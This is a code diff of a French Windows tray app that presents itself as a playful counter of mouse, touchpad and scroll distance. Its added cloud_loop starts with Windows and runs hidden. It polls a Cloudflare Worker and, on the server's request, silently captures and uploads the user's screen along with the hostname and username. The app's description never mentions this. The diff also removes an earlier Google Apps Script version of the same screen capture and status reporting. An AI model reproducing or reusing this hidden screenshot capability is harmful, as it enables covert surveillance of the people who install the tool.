@@ -3,12 +3,13 @@ AbsurdeKm
 Copyright (c) 2026 Fénix842/Fénix1048. Tous droits réservés.
 Ce logiciel ne peut être copié, modifié ou redistribué sans l'autorisation écrite de l'auteur.
 
-absurdeKm (Windows) - distance du pavé tactile, distance de la souris, distance de la molette, shorts vus bout à bout.
+absurdKm (Windows) - distance du pavé tactile, distance de la souris, distance de la molette, shorts vus bout à bout.
 
 Lancement : double-clic sur ce fichier. Aucun module à installer (bibliothèque standard uniquement).
 - Démarre automatiquement avec Windows, en arrière-plan (icône dans la zone de notification).
 - Fermer la fenêtre = la cacher dans la zone de notification. Quitter : clic droit sur l'icône > Quitter.
 - Pause / reprise : Alt + Ctrl droit, ou clic sur la pastille d'état.
+- Calibrage souris : Espace termine la calibration.
 - Thème : bouton ◐ en haut à droite. Il cycle Sombre > Claire > Pistache > Caramel, en boucle.
 """
 
@@ -31,7 +32,6 @@ import urllib.request
 import urllib.parse
 import winreg
 from ctypes import wintypes as w
-from datetime import datetime
 from pathlib import Path
 from tkinter import font as tkfont
 from tkinter import messagebox, ttk
@@ -55,17 +55,14 @@ SHOT_MAX_W = 2560                      # définition max de la capture envoyée 
 SHOT_MAX_H = 1600
 SHOT_QUALITY = 85                      # qualité JPEG (1-100)
 
-VERSION = "1.7.0"
+VERSION = "1.7.5"
 UPDATE_URL = "https://raw.githubusercontent.com/fenix1048/assets-21st.dev/main/absurdeKm.pyw"
 
-# --- état des PC, envoyé à ta feuille Google (privée) ---
-# SHEET_URL : l'adresse de ton script, qui se termine par /exec (à coller ici)
-SHEET_URL = "https://script.google.com/macros/s/AKfycbwZinF32_waWLOHoH-1JzLNRYKq4bqGJUIKiCqFqD9y1MvrdH-zSoco6hUowpsEGZDH/exec"
-STATUS_EVERY_S = 600
-
-# Remplace cette valeur par EXACTEMENT la même dans le Google Apps Script.
-CAPTURE_TOKEN = "8zBMhaK_2ntLj_hqEHPOVRJ0Xt7EbffyYpmrSmWC57c"
-CAPTURE_POLL_S = 8
+# --- tableau de bord en ligne (Cloudflare Worker) ---
+CLOUD_URL = "https://absurdkm.felixbrolletmoi.workers.dev/"   # ton adresse
+CLOUD_TOKEN = "12345642"         # le même mot de passe que dans le Worker et le HTML
+CLOUD_PUSH_S = 300     # envoi des stats toutes les 5 min (mets 30 pendant les tests)
+CLOUD_POLL_S = 10      # vérifie les demandes de capture toutes les 10 s
 
 DEFAULTS = {"unit": "Auto", "count_move": True, "count_drag": True, "count_scroll": False,
             "total_cm": 0.0, "today_cm": 0.0, "day": " ", "calib": None, "theme": "Sombre",
@@ -236,22 +233,7 @@ def install_update(info):
             pass
     threading.Thread(target=run, daemon=True).start()
 
-# ------------------------- envoi de l'état à la feuille (silencieux) -------------------------
-def publish_status(etat="En cours", timeout=8):
-    """Envoie l'état de ce PC à la feuille Google. Échec silencieux."""
-    if not SHEET_URL.startswith("https://") or "COLLE_ICI" in SHEET_URL:
-        return
-    try:
-        info = {"type": "status", "token": CAPTURE_TOKEN,
-                "pc": socket.gethostname(), "user": os.environ.get("USERNAME", ""),
-                "version": VERSION, "etat": etat}
-        req = urllib.request.Request(SHEET_URL, data=json.dumps(info).encode("utf-8"),
-                                     headers={"Content-Type": "application/json"}, method="POST")
-        urllib.request.urlopen(req, timeout=timeout).read()
-    except Exception:
-        pass
-
-# ------------------------- captures d'écran sur demande -------------------------
+# ------------------------- captures d'écran (sur demande) -------------------------
 SHOT_PS = r'''
 $ErrorActionPreference = "Stop"
 Add-Type -TypeDefinition @"
@@ -325,34 +307,43 @@ def capture_screen_jpeg_b64():
         raise RuntimeError("La capture d'écran est vide")
     return data
 
+# ------------------------- tableau de bord en ligne -------------------------
+def stats_snapshot():
+    """Ce qui est envoyé au tableau de bord : nom du PC, version, utilisateur et compteurs."""
+    return {
+        "version": VERSION,
+        "user": os.environ.get("USERNAME", ""),
+        "etat": "En pause" if T.paused else "En cours",
+        "pad_total_cm": CFG["total_cm"], "pad_today_cm": CFG["today_cm"], "pad_session_cm": T.session,
+        "mouse_total_cm": CFG["mouse_total_cm"], "mouse_today_cm": CFG["mouse_today_cm"],
+        "mouse_session_cm": MT.session,
+        "ticks": CFG["ticks"], "cm_per_tick": CFG["cm_per_tick"],
+        "shorts": CFG["shorts"], "short_cm": CFG["short_cm"],
+    }
 
-def poll_capture_commands():
-    """Interroge Apps Script ; une capture n'est faite que sur demande."""
+def cloud_request(path, data=None, timeout=30):
+    body = json.dumps(data).encode("utf-8") if data is not None else None
+    req = urllib.request.Request(
+        CLOUD_URL + path, data=body, method="POST" if data is not None else "GET",
+        headers={"Content-Type": "application/json", "X-Token": CLOUD_TOKEN, "User-Agent": APP_NAME})
+    with urllib.request.urlopen(req, timeout=timeout) as r:
+        return json.loads(r.read().decode("utf-8"))
+
+def cloud_loop():
+    """Envoie les stats régulièrement et exécute les demandes de capture. Échec silencieux."""
     pc = socket.gethostname()
+    last_push = 0.0
     while True:
         try:
-            query = urllib.parse.urlencode({"action": "poll", "pc": pc, "token": CAPTURE_TOKEN})
-            req = urllib.request.Request(SHEET_URL + "?" + query, headers={"User-Agent": APP_NAME})
-            with urllib.request.urlopen(req, timeout=12) as response:
-                command = json.loads(response.read().decode("utf-8"))
-            if command.get("capture"):
-                image_b64 = capture_screen_jpeg_b64()
-                payload = {
-                    "type": "capture", "token": CAPTURE_TOKEN,
-                    "pc": pc, "user": os.environ.get("USERNAME", ""),
-                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                    "image": image_b64
-                }
-                body = json.dumps(payload).encode("utf-8")
-                req = urllib.request.Request(SHEET_URL, data=body,
-                    headers={"Content-Type": "application/json", "User-Agent": APP_NAME}, method="POST")
-                with urllib.request.urlopen(req, timeout=60) as response:
-                    response.read()
+            if time.monotonic() - last_push >= CLOUD_PUSH_S:
+                cloud_request("/api/push", {"pc": pc, "stats": stats_snapshot()})
+                last_push = time.monotonic()
+            if cloud_request("/api/poll?pc=" + urllib.parse.quote(pc)).get("capture"):
+                image = capture_screen_jpeg_b64()
+                cloud_request("/api/result", {"pc": pc, "image": image}, timeout=60)
         except Exception:
-            # Échec silencieux : le suivi principal absurdeKm continue de fonctionner.
-            pass
-        time.sleep(CAPTURE_POLL_S)
-
+            pass  # absurdKm continue de compter même si le serveur ne répond pas
+        time.sleep(CLOUD_POLL_S)
 
 # ------------------------- API Windows -------------------------
 user32 = ctypes.WinDLL("user32")
@@ -900,6 +891,7 @@ class App:
         self.tab = "Pavé"
         self._job = None
         self._was_down = False
+        self._space_was_down = False
         self._ui = self._save = self._tip = 0.0
         self._pill_state = None
         self.wiz = None
@@ -926,11 +918,10 @@ class App:
         if hidden:
             r.withdraw()
         threading.Thread(target=raw_loop, daemon=True).start()
-        threading.Thread(target=poll_capture_commands, daemon=True, name="capture-poll").start()
+        threading.Thread(target=cloud_loop, daemon=True, name="cloud").start()
         self.tick()
         self.detect_short()
         r.after(15000, self.auto_check)
-        r.after(20000, self.heartbeat_loop)
 
     def fit(self):
         self.root.update_idletasks()
@@ -1129,7 +1120,7 @@ class App:
                                self.toggle_mouse_calib, kind="danger" if MT.cal else "primary")
         self.m_btn.pack(anchor="w", pady=(8, 6))
         tk.Label(cal, text="Pose la souris au début d'une règle, fais-la glisser en ligne droite "
-                           "sur la longueur indiquée, puis clique sur « Terminer ».",
+                           "sur la longueur indiquée, puis clique sur « Terminer » ou appuie sur Espace.",
                  bg=C["card"], fg=C["muted"], font=F(9), justify="left", anchor="w",
                  wraplength=int(380 * self.sc)).pack(fill="x")
 
@@ -1308,7 +1299,7 @@ class App:
         self.m_sess.config(text=f"{fmt(v)} {u}")
         cpc = CFG.get("mouse_cpc")
         if MT.cal:
-            info = f"Calibration en cours… {int(MT.counts)} unités"
+            info = f"Calibration en cours… {int(MT.counts)} unités  (Espace pour terminer)"
         elif cpc:
             info = f"Calibrée : {cpc:.1f} unités par cm  (≈ {cpc * 2.54:.0f} DPI)"
         else:
@@ -1379,8 +1370,6 @@ class App:
     def toggle(self):
         T.paused = not T.paused
         T.last = {}
-        etat = "En pause" if T.paused else "En cours"
-        threading.Thread(target=publish_status, args=(etat,), daemon=True).start()
         self.notify(playing=not T.paused)
         self.refresh()
 
@@ -1558,11 +1547,6 @@ class App:
         dark_titlebar(win, CFG["theme"] == "Sombre")
         upd()
 
-    def heartbeat_loop(self):
-        etat = "En pause" if T.paused else "En cours"
-        threading.Thread(target=publish_status, args=(etat,), daemon=True).start()
-        self.root.after(STATUS_EVERY_S * 1000, self.heartbeat_loop)
-
     # ---------------------------------------------------- mise à jour automatique --
     def auto_check(self):
         check_updates()
@@ -1600,7 +1584,6 @@ class App:
         MT.cal = False
         self.sync()
         save_cfg()
-        publish_status("Arrêté", timeout=4)
         TRAY.remove()
         self.root.destroy()
 
@@ -1610,6 +1593,13 @@ class App:
         if down and not self._was_down:
             self.toggle()
         self._was_down = bool(down)
+
+        # Espace : termine la calibration de la souris si elle est en cours
+        space = user32.GetAsyncKeyState(0x20) & 0x8000
+        if space and not self._space_was_down and MT.cal:
+            self.toggle_mouse_calib()
+        self._space_was_down = bool(space)
+
         while True:
             try:
                 c = CMDS.get_nowait()
